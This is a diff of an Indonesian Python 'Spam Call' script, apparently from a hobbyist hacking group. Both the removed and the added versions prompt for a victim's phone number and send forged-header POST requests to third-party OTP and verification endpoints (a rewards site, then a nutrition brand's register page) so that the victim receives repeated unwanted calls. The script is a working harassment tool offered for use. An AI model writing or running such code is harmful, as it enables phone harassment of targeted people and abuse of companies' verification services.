@@ -1,29 +1,41 @@
+import requests as rek
+import json,os,sys
 
-# module
-import os,sys,time,requests
-from time import sleep
-# formulir
-print("    ")
-nama = input("Siapa Nama Kaka: ")
-os.system("clear")
-print("\033[32;1mHay",nama)
-sleep(1)
-os.system("figlet SpamCall")
-banner= """
-\033[36;1m============================================
-\033[37;1m{•} Author : MR RED WHITE HACK 8
-\033[37;1m{•} Team   : CSI
-\033[36;1m============================================\033[37;1m"""
-sleep(1)
-print(banner)
-# pemasukan
-nomor = input("Nomor Target: ")
-jumlah = int(input("Jumlah Spam: "))
-# data call
-url = "https://id.jagreward.com/member/verify-mobile/"
-ua = {'Host': "id.jagreward.com",'Connection': "keep-alive",'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1724) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36'}
-dat = {"method": "CALL","countryCode": "id",}
-# hasil selesai
-for i in range(jumlah):
-    send = requests.post(url+nomor, headers=ua, data=dat)
-    print("\033[33;1m [•] Status ~+> ",(send.json()["message"]))
+os.system('clear')
+logo = """
+         Spam Telepon / Call
+  Author   : Daniel
+  Github   : https://github.com/DANIELBOT14323G/
+ Spam Call / Telepon Di Awali Dengan 
+          Contoh Penggunaan:
+  = 81234567891
+«~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~»\n"""
+
+os.system('clear')
+print(logo)
+target = input(" No Target : ")
+
+
+api_url = "https://www.nutriclub.co.id/otp/?phone=0"+target+"&old_phone=0"+target
+
+headers = {
+"Host": "www.nutriclub.co.id",
+"content-length": "0","accept":
+"application/json, text/javascript, */*; q=0.01",
+"x-requested-with": "XMLHttpRequest",
+"save-data": "on",
+"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1853) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
+"origin": "https://www.nutriclub.co.id",
+"sec-fetch-site": "same-origin",
+"sec-fetch-mode": "cors",
+"sec-fetch-dest": "empty","referer": "https://www.nutriclub.co.id/account/register",
+}
+
+
+respon = rek.post(api_url,headers).text
+
+status = json.loads(respon)["StatusMessage"]
+if status == "Request misscall berhasil":
+     print("\n {✓} Spam Call / Telepon Untuk No "+ target +" Berhasil \n")
+else:
+     print("\n {×} Spam sudah dilakukan 3x » Gagal \n")
